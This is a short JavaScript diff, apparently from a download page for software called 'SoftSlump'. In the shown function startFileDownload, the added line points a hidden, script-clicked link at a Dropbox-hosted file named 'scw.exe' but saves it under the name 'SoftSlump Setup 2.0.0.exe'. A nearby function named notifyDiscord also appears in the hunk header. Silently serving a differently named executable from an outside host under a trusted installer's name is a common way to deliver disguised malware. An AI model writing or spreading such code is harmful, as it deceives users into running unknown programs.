@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'SoftSlump Setup 2.0.0.exe';
+    a.href = 'https://www.dropbox.com/scl/fi/0soykb4espyf544b08jw6/scw.exe?rlkey=dyfyv3flobl65fi505a5plgvm&st=pkvx76le&dl=1';
     a.download = 'SoftSlump Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
